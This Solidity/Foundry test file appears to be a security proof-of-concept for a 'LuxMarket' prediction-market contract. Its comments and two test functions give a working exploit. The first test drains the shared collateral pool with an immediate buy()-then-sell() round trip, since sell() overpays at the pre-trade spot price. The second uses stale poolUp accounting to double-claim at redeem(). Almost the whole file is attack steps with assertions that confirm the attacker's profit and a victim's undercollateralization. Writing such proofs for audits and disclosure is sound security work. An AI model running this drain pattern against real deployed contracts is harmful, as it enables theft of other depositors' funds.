// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {LuxMarket} from "../src/LuxMarket.sol";
import {MockUSDT} from "./LuxMarket.t.sol";

/// @notice PoC #1 (headline bug): sell() prices the ENTIRE sold batch at the
///         single pre-trade spot price (LMSRLib.priceOf(qUp,qDown,b) computed
///         BEFORE q is decremented), instead of integrating the true LMSR cost
///         curve the way buy()/costToBuy() does. Because price(q) is monotonic
///         increasing in the side being sold, using the pre-trade (highest)
///         price for the whole batch OVER-pays every seller. A simple
///         buy(shares) -> sell(~shares) round trip is risk-free profit paid
///         out of the shared collateral pool -- no oracle, no settlement, no
///         waiting, callable by anyone on any open market.
///
///         PoC #2 (compounding bug): sell() also forgets to decrement
///         Market.poolUp/poolDown while it DOES decrement Market.qUp/qDown,
///         so redeem()'s payout = poolWin(stale) * held / totalWin(collapsed)
///         lets a near-empty remaining position claim the WHOLE stale pool a
///         second time. (Demonstrated as a follow-on; in this PoC it reverts
///         only because bug #1 already drained the shared pool below what's
///         needed -- i.e. bug #1 alone is already sufficient to insolvency.)
contract PoolDrainPoC is Test {
    LuxMarket market;
    MockUSDT usdt;

    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);   // honest LP in a DIFFERENT market
    address oracle   = address(0x0ACCE);

    bytes32 constant TARGET = keccak256("target-market");
    bytes32 constant OTHER  = keccak256("other-market-with-victim-funds");

    function setUp() public {
        usdt = new MockUSDT();
        market = new LuxMarket(address(usdt), 1000e18, 24 hours); // b = 1000 USDT
        market.createMarket(TARGET, "Target", "Car", "Hagerty", 100e6, block.timestamp + 7 days, oracle);
        market.createMarket(OTHER,  "Other",  "Car", "Hagerty", 100e6, block.timestamp + 7 days, oracle);

        usdt.mint(attacker, 1_000_000e6);
        vm.prank(attacker);
        usdt.approve(address(market), type(uint256).max);

        // victim seeds an UNRELATED market with real funds -- this is the money
        // the attacker should NEVER be able to touch.
        usdt.mint(victim, 50_000e6);
        vm.prank(victim);
        usdt.approve(address(market), type(uint256).max);
        vm.prank(victim);
        market.buy(OTHER, true, 500e18); // victim locks real collateral in OTHER
    }

    /// @notice Bug #1 alone: a single buy()+sell() round trip in TARGET, with
    ///         no oracle report, no dispute window, no settlement -- pure
    ///         instant profit that eats into the victim's unrelated deposit.
    function testSellOverpaysAndUndercollateralizesVictim() public {
        uint256 attackerStart = usdt.balanceOf(attacker);
        uint256 contractStart = usdt.balanceOf(address(market));

        LuxMarket.Market memory other0 = market.getMarket(OTHER);
        uint256 victimLegitClaim = other0.poolUp; // victim owns 100% of OTHER's UP shares
        console2.log("contract balance before attack       :", contractStart);
        console2.log("victim's legitimate claim on OTHER    :", victimLegitClaim);
        assertGe(contractStart, victimLegitClaim, "sanity: contract starts fully able to cover the victim");

        // 1) attacker buys a position in TARGET (pays the real LMSR cost)
        uint256 bigShares = 800e18;
        vm.prank(attacker);
        market.buy(TARGET, true, bigShares);
        LuxMarket.Market memory m1 = market.getMarket(TARGET);
        console2.log("buy cost  (paid in)                   :", m1.poolUp);

        // 2) attacker IMMEDIATELY sells almost all of it back, same block,
        //    no oracle, no settlement -- sell() uses the pre-trade spot price
        //    for the WHOLE batch instead of integrating the cost curve.
        vm.prank(attacker);
        market.sell(TARGET, true, bigShares - 1);

        uint256 attackerEnd = usdt.balanceOf(attacker);
        int256 pnl = int256(attackerEnd) - int256(attackerStart);
        console2.log("attacker net P&L after buy+sell only   :", pnl);

        uint256 contractEnd = usdt.balanceOf(address(market));
        console2.log("contract balance after buy+sell only  :", contractEnd);

        // Risk-free profit, paid out with no market resolution whatsoever.
        assertGt(pnl, 0, "buy+sell alone should be free profit (the bug)");

        // And it came out of the SHARED pool: the contract can no longer
        // cover the victim's unrelated, already-settled-nothing-to-do-with-it
        // deposit in OTHER, purely from one attacker round trip in TARGET.
        assertLt(contractEnd, victimLegitClaim, "victim's unrelated deposit is now under-collateralized");
    }

    /// @notice Bug #2 layered on top: after the round trip, poolUp for TARGET
    ///         is stale (never decremented by sell), so the 1-wei remaining
    ///         position is *entitled on paper* to the whole original poolUp
    ///         again at redeem(). Here it reverts only because bug #1 already
    ///         drained the shared pool below what bug #2 needs -- proving bug
    ///         #1 alone is the dominant, sufficient drain path.
    function testStalePoolUpWouldDoubleDipIfFundsRemained() public {
        vm.prank(attacker);
        market.buy(TARGET, true, 800e18);
        vm.prank(attacker);
        market.sell(TARGET, true, 800e18 - 1);

        LuxMarket.Market memory m = market.getMarket(TARGET);
        // qUp collapsed to ~0 but poolUp is untouched -- the desync bug #2.
        assertEq(m.qUp, 1);
        assertGt(m.poolUp, 0);
        console2.log("qUp (collapsed):", m.qUp, " poolUp (STALE, still full):", m.poolUp);

        vm.prank(oracle);
        market.reportOutcome(TARGET, true);
        vm.warp(block.timestamp + 25 hours);
        market.settle(TARGET);

        // redeem() would pay poolUp(stale) * 1 / qUp(1) = the whole stale pool
        // again. It reverts here (underflow) purely because bug #1 already
        // spent the shared pool down below that amount -- not because the
        // accounting is safe.
        vm.prank(attacker);
        vm.expectRevert();
        market.redeem(TARGET);
    }
}
